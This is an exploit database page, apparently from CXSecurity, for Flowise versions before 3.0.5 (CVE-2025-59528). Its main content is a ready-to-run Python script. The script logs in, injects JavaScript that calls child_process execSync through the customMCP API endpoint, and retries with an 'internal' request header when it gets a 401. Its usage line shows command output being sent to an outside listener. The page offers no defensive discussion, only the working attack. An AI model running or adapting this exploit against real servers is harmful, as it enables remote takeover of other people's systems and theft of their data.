---
title: Flowise 3.0.4 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025110001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-11-01
fetch_date: 2025-11-02T03:15:17.392705
---

# Flowise 3.0.4 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Flowise 3.0.4 Remote Code Execution** **2025.11.01**  Credit:  **[nltt0](https://cxsecurity.com/author/nltt0/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-59528](https://cxsecurity.com/cveshow/CVE-2025-59528/ "Click to see CVE-2025-59528")** | **[CVE-2025-58434](https://cxsecurity.com/cveshow/CVE-2025-58434/ "Click to see CVE-2025-58434")**  CWE: **N/A** | |

# Exploit Title: Flowise 3.0.4 - Remote Code Execution (RCE)
# Date: 10/11/2025
# Exploit Author: [nltt0] (https://github.com/nltt-br))
# Vendor Homepage: https://flowiseai.com/
# Software Link: https://github.com/FlowiseAI/Flowise
# Version: < 3.0.5
# CVE: CVE-2025-59528
from requests import post, session
from argparse import ArgumentParser
banner = r"""
\_\_\_\_\_ \_ \_\_\_\_\_
/ \_\_ \ | | / \_\_\_|
| / \/ \_\_ \_| | \_\_ \_ \_ \_\_ \_\_ \_ \_\_\_ \_\_\_ \ `--.
| | / \_` | |/ \_` | '\_ \ / \_` |/ \_ \/ \_\_| `--. \
| \\_\_/\ (\_| | | (\_| | | | | (\_| | (\_) \\_\_ \/\\_\_/ /
\\_\_\_\_/\\_\_,\_|\_|\\_\_,\_|\_| |\_|\\_\_, |\\_\_\_/|\_\_\_/\\_\_\_\_/
\_\_/ |
|\_\_\_/
by nltt0
"""
try:
parser = ArgumentParser(description='CVE-2025-59528 [Flowise < 3.0.5]', usage="python CVE-2025-58434.py --email xtz@local --password Test@2025 --url http://localhost:3000 --cmd \"http://localhost:1337/`whoami`\"")
parser.add\_argument('-e', '--email', required=True, help='Registered email')
parser.add\_argument('-p', '--password', required=True)
parser.add\_argument('-u', '--url', required=True)
parser.add\_argument('-c', '--cmd', required=True)
args = parser.parse\_args()
email = args.email
password = args.password
url = args.url
cmd = args.cmd
def login(email, url):
session = session()
url\_format = "{}/api/v1/auth/login".format(url)
headers = {"x-request-from": "internal", "Accept-Language": "pt-BR,pt;q=0.9", "Accept": "application/json, text/plain, \*/\*", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Origin": "http://workflow.flow.hc", "Referer": "http://workflow.flow.hc/signin", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
data={"email": email, "password": password}
r = session.post(url\_format, headers=headers, json=data)
return session, r
def rce(email, url, password, cmd):
session, status\_code = login(email, url)
url\_format = "{}/api/v1/node-load-method/customMCP".format(url)
command = f'({{x:(function(){{const cp = process.mainModule.require("child\_process");cp.execSync("{cmd}");return 1;}})()}})'
data = {
"loadMethod": "listActions",
"inputs": {
"mcpServerConfig": command
}
}
r = session.post(url\_format, json=data)
if r.status\_code == 401:
session.headers["x-request-from"] = "internal"
session.post(url\_format, json=data)
print(f"[x] Command executed [{cmd}]")
rce(email, url, password, cmd)
except Exception as e:
print('Error in {}'.format(e))

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025110001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top